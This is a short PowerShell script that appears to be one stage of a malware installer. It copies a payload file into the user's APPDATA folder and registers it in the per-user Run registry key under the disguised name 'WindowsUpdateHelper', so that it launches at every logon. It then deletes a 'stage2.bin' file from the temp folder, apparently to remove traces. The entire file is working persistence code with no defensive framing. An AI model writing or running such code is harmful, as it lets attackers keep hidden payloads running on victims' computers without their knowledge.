[CmdletBinding()]
param(
    [string]$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    [string]$RegistryValue = 'WindowsUpdateHelper',
    [string]$PersistencePath = "$env:APPDATA\payload.ps1"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path 'C:\ProgramData\payload.bin' -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
$StageResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $StageResult.$RegistryValue)

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
